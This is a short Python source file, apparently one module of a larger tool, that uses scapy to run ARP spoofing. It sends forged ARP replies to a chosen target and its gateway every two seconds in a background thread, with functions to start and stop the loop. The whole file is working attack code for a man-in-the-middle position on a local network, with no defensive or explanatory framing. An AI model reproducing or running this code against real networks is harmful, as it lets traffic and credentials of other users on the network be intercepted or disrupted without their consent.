from scapy.all import ARP, send
import threading
import time

spoofing = True

def spoof(target_ip, spoof_ip):
    packet = ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=spoof_ip)
    send(packet, verbose=False)

def start_arp_spoof(target_ip, gateway_ip):
    def spoof_loop():
        global spoofing
        while spoofing:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            time.sleep(2)
    
    thread = threading.Thread(target=spoof_loop)
    thread.daemon = True
    thread.start()
    return f"[+] ARP spoofing started between {target_ip} and {gateway_ip}"

def stop_arp_spoof():
    global spoofing
    spoofing = False
    return "[x] ARP spoofing stopped."
